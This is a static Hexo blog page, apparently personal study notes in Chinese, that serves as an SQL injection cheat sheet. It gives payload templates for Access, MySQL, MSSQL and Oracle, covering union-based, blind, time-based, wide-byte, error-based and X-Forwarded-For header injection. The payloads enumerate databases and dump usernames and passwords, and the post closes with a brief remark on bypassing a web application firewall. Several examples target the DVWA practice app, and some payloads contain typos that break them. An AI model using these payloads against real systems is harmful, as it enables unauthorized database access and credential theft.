@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ed" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      sql注入 
+      
+      
+      |
+    
+     EdandEin&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Ed</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">sql注入</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-03-24 16:38:11
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="access联合查询"><a href="#access联合查询" class="headerlink" title="access联合查询"></a>access联合查询</h1><p>asp一般搭配access、aspx一般搭配mssql、php一般搭配mysql</p>
+<p>access只有一个数据库，不用爆库名</p>
+<p>order by (&#x3D;&#x3D;-&#x3D;&#x3D;) 猜字段数</p>
+<p>union select ……,&#x3D;&#x3D;爆信息&#x3D;&#x3D;,…… from （&#x3D;&#x3D;要查的表名&#x3D;&#x3D;）</p>
+<p>可以通过后台登陆页面的源代码查看账号以及密码的可能的字段名</p>
+<h1 id="access盲注"><a href="#access盲注" class="headerlink" title="access盲注"></a>access盲注</h1><p>&#x3D;&#x3D;（select count（*）from msysobjects)&gt;0&#x3D;&#x3D;</p>
+<p>msysobjects access的专属表名，在web中访问没有权限，会报错。如果没报错说明数据库是mssql的</p>
+<p>&lt;&gt;(select coount(*)from &#x3D;&#x3D;要猜的表名&#x3D;&#x3D;)</p>
+<p>通过回显判断要查询的表名是否存在</p>
+<p>(select count(*)from &#x3D;&#x3D;要猜的表名&#x3D;&#x3D;)&#x3D; &#x3D;&#x3D;-&#x3D;&#x3D;</p>
+<p>判断表内数据有几行</p>
+<p>1&#x3D;(select count(*)from &#x3D;&#x3D;表名&#x3D;&#x3D; where len (&#x3D;&#x3D;字段名&#x3D;&#x3D;)&gt;0)</p>
+<p>判断字段名是否存在</p>
+<p>(select top 1 asc(mid(&#x3D;&#x3D;字段名&#x3D;&#x3D; 1,1))from &#x3D;&#x3D;表名&#x3D;&#x3D;)&#x3D; &#x3D;&#x3D;-&#x3D;&#x3D;</p>
+<p>判断top 1(第一行),截取第一个数据的ASCII码是多少</p>
+<h1 id="mysql联合查询"><a href="#mysql联合查询" class="headerlink" title="mysql联合查询"></a>mysql联合查询</h1><p>字符型要闭合单引号，有魔术引号就转码</p>
+<p>order by &#x3D;&#x3D;*&#x3D;&#x3D;猜字段数</p>
+<p>union select …,&#x3D;&#x3D;爆信息&#x3D;&#x3D;,…    #user() 爆权限；#database() 爆当前数据库名；#version() 爆数据库版本</p>
+<p>union select …,group_concat(table_name),… from information_schema.tables where table_schema&#x3D; ‘&#x3D;&#x3D;数据库名&#x3D;&#x3D;’  #爆表名 </p>
+<p>union select …,group_concat(column_name),… from information_schema.columns where table_name&#x3D; ‘&#x3D;&#x3D;列名&#x3D;&#x3D;’  #爆列名</p>
+<p>union select ……,&#x3D;&#x3D;爆内容&#x3D;&#x3D;,…… from （&#x3D;&#x3D;查出的列名&#x3D;&#x3D;）</p>
+<p>##查询其他数据库的数据</p>
+<p>union select …,group_concat(schema_name),… from information_schema.schemata  查数据库 </p>
+<p>union select …,group_concat(&#x3D;&#x3D;字段内容&#x3D;&#x3D;),… from &#x3D;&#x3D;库名&#x3D;&#x3D;.&#x3D;&#x3D;表名&#x3D;&#x3D;查字段内容</p>
+<h1 id="mysql-cookie注入"><a href="#mysql-cookie注入" class="headerlink" title="mysql-cookie注入"></a>mysql-cookie注入</h1><p>and 1&#x3D;2 是为了让前面的查询为空，这样才能显示后面的数据</p>
+<h1 id="mysql盲注"><a href="#mysql盲注" class="headerlink" title="mysql盲注"></a>mysql盲注</h1><p>length、substr、ascii能在括号内也能在括号外使用</p>
+<p>常用函数 exists() ascii() substr() ord() mid() length() left() regexp()</p>
+<p>使用例子 substr(‘root’,1,3)</p>
+<p>mid(‘root’,1,3)</p>
+<p>mid 和 substr 是一样的</p>
+<p>ord 和 ascii 是一样的</p>
+<p>and (select length(user) from users limit 0,1)&gt;0 &#x3D;  and length((select user from users limit 0,1))&gt;0</p>
+<p>1’ and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1)&gt;0#</p>
+<p>and database()&#x3D;’dvwa’#</p>
+<p>and length(database())&#x3D; &#x3D;&#x3D;4&#x3D;&#x3D;#  爆数据库长度</p>
+<p>and ascii(substr(database(),&#x3D;&#x3D;4&#x3D;&#x3D;,1))&#x3D;’&#x3D;&#x3D;97&#x3D;&#x3D;’ #  逐字爆库</p>
+<p>and ( select count(table_name) from information_schema.tables where table_schema&#x3D;’dvwa’)&#x3D; &#x3D;&#x3D;2&#x3D;&#x3D;#  判断数据库内有多少个表 这里可以用*代替table_name</p>
+<p> and length((select table_name from information_schema.tables where table_schema&#x3D;’dvwa’ limit &#x3D;&#x3D;0&#x3D;&#x3D;,1))&gt; &#x3D;&#x3D;0&#x3D;&#x3D;#  爆表名长度</p>
+<p> and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1),2,1))&gt;0#  逐字报表</p>
+<p>and (select count(columns_name) from information_schema.columns where table_name&#x3D;’users’)&#x3D;15# 判断表内有多少列</p>
+<p>and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1))&gt;0# 判断列名长度</p>
+<p>and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;0# 逐字爆列</p>
+<p>and (select count(&#x3D;&#x3D;user&#x3D;&#x3D;) from &#x3D;&#x3D;users&#x3D;&#x3D;)&gt;0#  猜字段内有多少数据</p>
+<p>and (select length(&#x3D;&#x3D;user&#x3D;&#x3D;) from &#x3D;&#x3D;users&#x3D;&#x3D; limit 0,1)&gt;0# 猜数据长度</p>
+<p>and ascii(substr((select user from users limit 0,1),1,1))&gt;0# 逐字爆数据内容</p>
+<h1 id="延时注入-宽字节注入"><a href="#延时注入-宽字节注入" class="headerlink" title="延时注入+宽字节注入"></a>延时注入+宽字节注入</h1><p>延时注入跟布尔差不多，就多了sleep（）</p>
+<p>宽字节注入加入宽字节就行</p>
+<p>%df</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>这三个函数都能使用</p>
+<p>select extractvalue(1,concat(‘<del>‘,(select database()),’</del>‘))</p>
+<p>select updatexml(1,concat(‘~’,(select database())),1)</p>
+<p>select count(*),concat((select database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x</p>
+<h1 id="x-forwarded-for头注入"><a href="#x-forwarded-for头注入" class="headerlink" title="x-forwarded-for头注入"></a>x-forwarded-for头注入</h1><p>127.0.0.1’, updataxml (1,concat(0x7e, (select user() ),0x7e ),1 ) #  爆用户权限</p>
+<p>127.0.0.1’, updataxml (1, concat (0x7e,(select database() ) , 0x7e ) ,1) #  爆数据库</p>
+<p>127.0.0.1’, and updataxml (1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D; &#x3D;&#x3D;database()&#x3D;&#x3D; limit 0,1), 0x7e),1)#  获取第一个表名</p>
+<p>127.0.0.1’, and updataxml (1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D; &#x3D;&#x3D;database()&#x3D;&#x3D; and  table_name&#x3D; &#x3D;&#x3D;’users’&#x3D;&#x3D; limit 0,1), 0x7e),1)#  获取第一个字段名</p>
+<p>127.0.0.1’, updataxml (1,concat(0x7e, (select concat (username, password) from user limit 0,1), 0x7e ), 1 ) #  爆字段内容</p>
+<h1 id="mssql注入"><a href="#mssql注入" class="headerlink" title="mssql注入"></a>mssql注入</h1><p>order by &#x3D;&#x3D;4&#x3D;&#x3D;</p>
+<p>and 1&#x3D;2 union all select null,’null’,null,null</p>
+<p>and 1&#x3D;2 union all select null,’2’,’3’,null</p>
+<p>加all能显示重复内容，mssql的字段分数据类型，所以要用单引号判断显示位</p>
+<p>and 1&#x3D;2 union all select null,(select db_name()),null,null  爆数据库名</p>
+<p>and 1&#x3D;2 union all select null,(select @@version),null,null  爆数据库版本</p>
+<p> and 1&#x3D;2 union all select null,(select top 1 from &#x3D;&#x3D;数据库名&#x3D;&#x3D;.dbo.sysobjects where xtype&#x3D;’u’),null,null</p>
+<p>爆表名，mssql没有limit，用top1表示第一个（不懂为什么要加top1???)， sysobjects类似于mysql里的information_schema，xtype&#x3D;’s’是系统自带的表，一般查询xtype&#x3D;’u’这是用户创建的表，dbo应该是表示获取路径是数据库吧</p>
+<p> and 1&#x3D;2 union all select null,(select top 1 col_name(objects_id(‘&#x3D;&#x3D;表名&#x3D;&#x3D;’),&#x3D;&#x3D;3&#x3D;&#x3D;)from sysobjects),null,null</p>
+<p>爆列名，objects_id每一个字段该值是唯一的，并且该值只对应用户创建的表，不对应系统创建的, 该函数会返回指定对象的id值</p>
+<p>大家都知道在数据库中有一个系统表sysobjects，里面存储了数据库各个对象的信息。可以查询下看看结果。可以看出每个对象都有一个ID，这个表存储了表，存储过程，触发器，视图等相关信息。注意：字段没有。</p>
+<p> object_id就是根据对象名称返回该对象的id.<br> object_name是根据对象id返回对象名称.<br> select object_id(对象名)等同于:<br> select id from sysobjects where name&#x3D;对象名。                                       select object_name(id号)等同于:<br> select name from sysobjects where id&#x3D;id号</p>
+<p>and 1&#x3D;2 union all select null,(select top 1 &#x3D;&#x3D;username&#x3D;&#x3D; from &#x3D;&#x3D;列名&#x3D;&#x3D;),null,null</p>
+<p>爆字段</p>
+<h1 id="oracle注入"><a href="#oracle注入" class="headerlink" title="oracle注入"></a>oracle注入</h1><p>oracle最高权限DBA</p>
+<p>管理员用户system </p>
+<p>order by&#x3D;&#x3D;2&#x3D;&#x3D;</p>
+<p>爆字段</p>
+<p>and 1&#x3D;2 union select null,’null’ from dual</p>
+<p>and 1&#x3D;2 union select null,’&#x3D;&#x3D;2&#x3D;&#x3D;’ from &#x3D;&#x3D;dual&#x3D;&#x3D;</p>
+<p>跟mssql一样，字段都分数据类型，oracle查询要跟表名，dual是oracle中附带的一张虚拟表</p>
+<p>and 1&#x3D;2 union select null,(select sys_context(‘userenv’,’current_user’)from dual) from dual</p>
+<p>爆数据库当前用户</p>
+<p>and 1&#x3D;2 union select null,(select instance_name from V$INSTANCE) from dual</p>
+<p>爆数据库名</p>
+<p>and 1&#x3D;2 union select null,(select banner from sys.v_$version where rownum&#x3D;1) from dual</p>
+<p>爆数据库版本，因为每次只能回显一条数据，所以要加where rownum&#x3D;1</p>
+<p>and 1&#x3D;2 union select null,(select table_name where rownum&#x3D;1 and &#x3D;&#x3D;table_name like ‘%user%’&#x3D;&#x3D;) from dual</p>
+<p>爆表名，table_name like ‘%user%’相当于检索于users有关的表</p>
+<p>and 1&#x3D;2 union select null,(select column_name from user_tab_name where table_name&#x3D;’&#x3D;&#x3D;user&#x3D;&#x3D;’ and rounum&#x3D;1) from dual</p>
+<p>and 1&#x3D;2 union select null,(select column_name from user_tab_name where table_name&#x3D;’&#x3D;&#x3D;user&#x3D;&#x3D;’ and rounum&#x3D;1 and column_name not in(‘&#x3D;&#x3D;username&#x3D;&#x3D;’)) from dual</p>
+<p>爆列名，column_name not in(‘&#x3D;&#x3D;username&#x3D;&#x3D;’)为排除查询过的列名</p>
+<p>and 1&#x3D;2 union select username,password from “users” &#x3D;&#x3D;where user &lt;&gt; ‘admin’&#x3D;&#x3D;</p>
+<p>爆字段， where user &lt;&gt; ‘admin’ ，为排除已查询的信息&lt;&gt;是不等于</p>
+<h1 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h1><p>所有waf思路都差不多，内联注释加编码换行这是常用的，另外还有替换常用函数等方法，这个后面有时间会更新</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/02/27/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-03-24 16:38:11
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/05/06/%E6%89%93%E7%8B%97%E6%A3%8D%E6%B3%95/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#access%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">access联合查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#access%E7%9B%B2%E6%B3%A8"><span class="toc-text">access盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">mysql联合查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql-cookie%E6%B3%A8%E5%85%A5"><span class="toc-text">mysql-cookie注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql%E7%9B%B2%E6%B3%A8"><span class="toc-text">mysql盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">延时注入+宽字节注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x-forwarded-for%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">x-forwarded-for头注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mssql%E6%B3%A8%E5%85%A5"><span class="toc-text">mssql注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#oracle%E6%B3%A8%E5%85%A5"><span class="toc-text">oracle注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#waf%E7%BB%95%E8%BF%87"><span class="toc-text">waf绕过</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/edandein">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2022 Edandein
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + sql%E6%B3%A8%E5%85%A5 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F03%2F24%2FSQL%25E6%25B3%25A8%25E5%2585%25A5%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
